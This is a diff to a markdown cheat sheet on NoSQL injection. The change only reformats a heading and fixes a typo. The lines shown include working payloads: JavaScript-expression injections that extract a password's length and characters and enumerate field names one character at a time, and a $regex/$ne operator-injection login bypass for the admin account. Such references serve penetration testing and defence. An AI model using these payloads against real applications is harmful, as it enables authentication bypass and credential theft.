@@ -59,15 +59,13 @@ Extracting Password:
 ' && this.password.length < 50%00 >> For extracting password length in URL
 ' && this.password[0] == 'a'%00 >> For extracting password in URL
 ```
-Extracting Field names:
+### Identifying field names
 ```
 ' && this.anything && 'a'=='b >> Confirming if there is a field name
-' && this.username!=' >> Identifying field names [Note: If there is username field exists, it will response with different type of message]
+' && this.username!=' >> Identifying field names [Note: If there is a username field exists, it will response with different type of message]
 ' && this['u'] && 'a'=='b >> Retrieving field name character by character
 ' && this.u.s.e.r.n.a.m['e'] && 'a'=='b
 ```
-### Identifying field names
-
 # Operator Injection To Retrieving Unknown Data
 
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
